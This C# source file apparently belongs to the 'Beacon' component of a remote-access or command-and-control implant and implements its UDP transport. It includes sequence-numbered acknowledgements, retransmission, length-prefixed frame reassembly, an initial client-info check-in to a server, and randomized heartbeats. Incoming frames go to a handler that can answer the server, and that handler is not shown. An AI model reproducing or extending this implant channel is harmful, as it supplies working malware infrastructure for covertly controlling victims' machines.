using Beacon.Helper;
using Beacon.MessagePackLib;
using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Timers;
using System.Threading.Tasks;

namespace Beacon
{
    internal class UDPBeacon
    {
        // Reliable UDP framing: [1 byte flags][4 bytes seq BE][4 bytes len BE] + payload
        private const byte FLAG_DATA = 0x01;
        private const byte FLAG_ACK = 0x02;
        private const int HEADER_SIZE = 1 + 4 + 4;
        private const int MAX_PAYLOAD = 1400;

        private UdpClient _udp;
        private IPEndPoint _serverEp;
        private volatile bool _running;
        private Thread _recvThread;
        private readonly object _sendLock = new object();
        private int _sendSeq;
        private readonly ConcurrentDictionary<int, ManualResetEventSlim> _ackWaiters = new ConcurrentDictionary<int, ManualResetEventSlim>();
        private System.Timers.Timer _heartbeatTimer;
        private byte[] _accumulator = new byte[0];

        public bool Start(string host, int port)
        {
            try
            {
                Stop();
                _udp = new UdpClient();
                _udp.Client.ReceiveBufferSize = 1 << 20;
                _udp.Client.SendBufferSize = 1 << 20;
                _serverEp = new IPEndPoint(IPAddress.Parse(host), port);
                _running = true;
                _recvThread = new Thread(ReceiveLoop) { IsBackground = true };
                _recvThread.Start();

                // Send initial ClientInfo with 4-byte length prefix (to support reassembly)
                var first = BeaconHandle.BuildClientInfo();
                SendReliable(WithLenPrefix(first));

                // Heartbeat every ~20-30s (randomized like TCP)
                _heartbeatTimer = new System.Timers.Timer(new Random().Next(20000, 30000));
                _heartbeatTimer.AutoReset = true;
                _heartbeatTimer.Elapsed += (_, __) =>
                {
                    try { 
                        BeaconHandle.KeepAlive(b => SendReliable(WithLenPrefix(b)));
                    } 
                    catch 
                    { }
                };
                _heartbeatTimer.Start();
                return true;
            }
            catch
            {
                Stop();
                return false;
            }
        }

        public void Stop()
        {
            try { _heartbeatTimer?.Stop(); } catch { }
            try { _heartbeatTimer?.Dispose(); } catch { }
            _running = false;
            try { _udp?.Close(); } catch { }
            try { _recvThread?.Join(200); } catch { }
        }

        private void ReceiveLoop()
        {
            while (_running)
            {
                try
                {
                    IPEndPoint remote = null;
                    var datagram = _udp.Receive(ref remote);
                    if (remote == null) continue;
                    if (datagram.Length < HEADER_SIZE) continue;
                    var flags = datagram[0];
                    int seq = ReadInt32BE(datagram, 1);
                    int len = ReadInt32BE(datagram, 5);

                    if ((flags & FLAG_ACK) == FLAG_ACK)
                    {
                        if (_ackWaiters.TryRemove(seq, out var ev)) { try { ev.Set(); } catch { } try { ev.Dispose(); } catch { } }
                        continue;
                    }

                    if ((flags & FLAG_DATA) != FLAG_DATA) continue;
                    if (len < 0 || len > MAX_PAYLOAD) continue;
                    if (datagram.Length < HEADER_SIZE + len) continue;

                    // Debug: print header and payload preview
                    try
                    {
                        Console.WriteLine($"[UDPBeacon DEBUG] 收到DATA 来自={remote} flags=0x{flags:X2} seq={seq} len={len}");
                        int prev = Math.Min(32, len);
                        var prevHex = BitConverter.ToString(datagram, HEADER_SIZE, prev);
                        Console.WriteLine($"[UDPBeacon DEBUG] 前{prev}字节: {prevHex}");
                    }
                    catch { }

                    var payload = new byte[len];
                    Buffer.BlockCopy(datagram, HEADER_SIZE, payload, 0, len);

                    // ACK back
                    SendAckAsync(seq);

                    // Append to accumulator and extract framed messages: [4-byte len BE] + payload
                    if (_accumulator.Length == 0)
                    {
                        _accumulator = new byte[payload.Length];
                        Buffer.BlockCopy(payload, 0, _accumulator, 0, payload.Length);
                    }
                    else
                    {
                        var combined = new byte[_accumulator.Length + payload.Length];
                        Buffer.BlockCopy(_accumulator, 0, combined, 0, _accumulator.Length);
                        Buffer.BlockCopy(payload, 0, combined, _accumulator.Length, payload.Length);
                        _accumulator = combined;
                    }

                    int offset = 0;
                    while (true)
                    {
                        if (_accumulator.Length - offset < 4) break;
                        int frameLen = ReadInt32BE(_accumulator, offset);
                        if (frameLen <= 0 || frameLen > 16 * 1024 * 1024)
                        {
                            Console.WriteLine($"[UDPBeacon ERROR] 非法帧长度: {frameLen}, 清空累积");
                            _accumulator = new byte[0];
                            break;
                        }
                        if (_accumulator.Length - offset - 4 < frameLen) break;

                        var frame = new byte[frameLen];
                        Buffer.BlockCopy(_accumulator, offset + 4, frame, 0, frameLen);
                        try
                        {
                            BeaconHandle.OnFrame(b => SendReliable(WithLenPrefix(b)), frame);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[UDPBeacon ERROR] OnFrame 异常: {ex.Message}");
                        }
                        offset += 4 + frameLen;
                    }

                    if (offset == 0)
                    {
                        // keep as is
                    }
                    else if (offset >= _accumulator.Length)
                    {
                        _accumulator = new byte[0];
                    }
                    else
                    {
                        int remaining = _accumulator.Length - offset;
                        var tail = new byte[remaining];
                        Buffer.BlockCopy(_accumulator, offset, tail, 0, remaining);
                        _accumulator = tail;
                    }
                }
                catch
                {
                }
            }
        }

        private void SendReliable(byte[] data)
        {
            if (_udp == null) return;
            int offset = 0;
            while (offset < data.Length)
            {
                int chunk = Math.Min(MAX_PAYLOAD, data.Length - offset);
                var packet = new byte[HEADER_SIZE + chunk];
                packet[0] = FLAG_DATA;
                int seq;
                lock (_sendLock)
                {
                    seq = _sendSeq;
                    _sendSeq = (_sendSeq + 1) & 0x7FFFFFFF;
                }
                WriteInt32BE(packet, 1, seq);
                WriteInt32BE(packet, 5, chunk);
                Buffer.BlockCopy(data, offset, packet, HEADER_SIZE, chunk);

                int retries = 0;
                while (true)
                {
                    var ev = new ManualResetEventSlim(false);
                    _ackWaiters[seq] = ev;
                    try { _udp.Send(packet, packet.Length, _serverEp); } catch { }

                    if (ev.Wait(2000))
                    {
                        _ackWaiters.TryRemove(seq, out _);
                        try { ev.Dispose(); } catch { }
                        break;
                    }
                    retries++;
                    if (retries >= 5)
                    {
                        _ackWaiters.TryRemove(seq, out _);
                        try { ev.Dispose(); } catch { }
                        return; // give up this chunk; keepalive/next send will refresh
                    }
                }

                offset += chunk;
            }
        }

        private static byte[] WithLenPrefix(byte[] payload)
        {
            var buf = new byte[4 + payload.Length];
            buf[0] = (byte)((payload.Length >> 24) & 0xFF);
            buf[1] = (byte)((payload.Length >> 16) & 0xFF);
            buf[2] = (byte)((payload.Length >> 8) & 0xFF);
            buf[3] = (byte)(payload.Length & 0xFF);
            Buffer.BlockCopy(payload, 0, buf, 4, payload.Length);
            return buf;
        }

        private void SendAckAsync(int seq)
        {
            try
            {
                var buf = new byte[HEADER_SIZE];
                buf[0] = FLAG_ACK;
                WriteInt32BE(buf, 1, seq);
                WriteInt32BE(buf, 5, 0);
                _udp.Send(buf, buf.Length, _serverEp);
            }
            catch { }
        }

        private static int ReadInt32BE(byte[] b, int offset)
        {
            return (b[offset] << 24) | (b[offset + 1] << 16) | (b[offset + 2] << 8) | b[offset + 3];
        }

        private static void WriteInt32BE(byte[] b, int offset, int value)
        {
            b[offset] = (byte)((value >> 24) & 0xFF);
            b[offset + 1] = (byte)((value >> 16) & 0xFF);
            b[offset + 2] = (byte)((value >> 8) & 0xFF);
            b[offset + 3] = (byte)(value & 0xFF);
        }
    }
}
